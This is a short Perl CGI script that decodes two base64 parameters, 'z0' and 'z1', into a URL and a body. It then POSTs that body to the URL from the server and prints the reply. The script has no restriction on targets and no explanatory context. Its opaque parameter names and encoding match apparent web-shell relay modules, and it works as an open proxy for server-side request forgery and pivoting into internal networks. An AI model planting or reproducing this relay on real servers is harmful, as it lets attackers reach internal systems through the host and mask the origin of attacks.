use strict;
use warnings;
use CGI;
use MIME::Base64;
use LWP::UserAgent;
use HTTP::Request;

sub main {
    my $q = CGI->new;

    my $z0 = $q->param('z0') // '';
    my $z1 = $q->param('z1') // '';

    my $url  = decode_base64($z0);
    my $data = decode_base64($z1);

    $url =~ s/^\s+|\s+$//g if $url;

    if (!$url || $url eq '') {
        return;
    }

    my $ua = LWP::UserAgent->new;
    $ua->timeout(15);
    $ua->env_proxy;
    $ua->agent("Mozilla/5.0");

    my $req = HTTP::Request->new(POST => $url);
    $req->header('Content-Type' => 'application/x-www-form-urlencoded');
    $req->content($data);

    my $response = $ua->request($req);
    my $body = $response->decoded_content // $response->content;

    print $body;

    return;
}

main();